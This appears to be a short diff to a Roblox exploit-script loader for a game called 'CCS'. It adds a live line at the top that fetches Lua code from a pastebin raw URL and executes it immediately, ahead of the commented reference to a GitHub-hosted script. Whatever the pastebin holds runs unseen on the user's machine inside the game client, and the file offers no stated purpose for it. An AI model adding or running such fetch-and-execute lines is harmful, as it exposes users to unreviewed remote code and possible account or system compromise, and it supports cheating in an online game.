@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/tZJF8g3K'))()
 --< Loadstring: loadstring(game:HttpGet('https://raw.githubusercontent.com/xrtzrr/scripts/main/CarCrashSystem.lua'))()
 --< Game: https://www.roblox.com/games/9601565001/CCS
 
